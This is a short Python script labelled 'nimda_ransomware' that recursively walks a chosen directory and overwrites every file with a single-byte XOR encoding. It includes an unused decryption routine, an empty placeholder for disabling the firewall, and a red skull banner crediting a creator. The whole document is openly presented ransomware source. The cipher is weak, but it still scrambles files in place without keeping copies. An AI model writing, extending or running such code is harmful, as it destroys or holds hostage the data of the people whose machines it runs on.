#!/usr/bin/env python3
import os
import shutil
import argparse

def enc_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = bytearray(b ^ key for b in data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def dec_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    decrypted_data = bytearray(b ^ key for b in data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

def disable_firewall():
    pass  # Placeholder for firewall disabling (not implemented for safety)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="nimda_ransomware")
    parser.add_argument("directory", help="Directory to encrypt")
    parser.add_argument("key", type=int, choices=range(256), help="Encryption key (0-255)")
    args = parser.parse_args()

    disable_firewall()

    for root, dirs, files in os.walk(args.directory):
        for file in files:
            file_path = os.path.join(root, file)
            enc_file(file_path, args.key)

    # Print the skeleton ASCII art and creator's name in red
    print("\033[91m")  # Start red color
    print("            .-.")
    print("           (0.0)")
    print("         '=.|m|.='")
    print("jgs     .='`\"``=.")
    print("Created by Kabungo Titus")
    print("\033[0m")  # Reset color to default
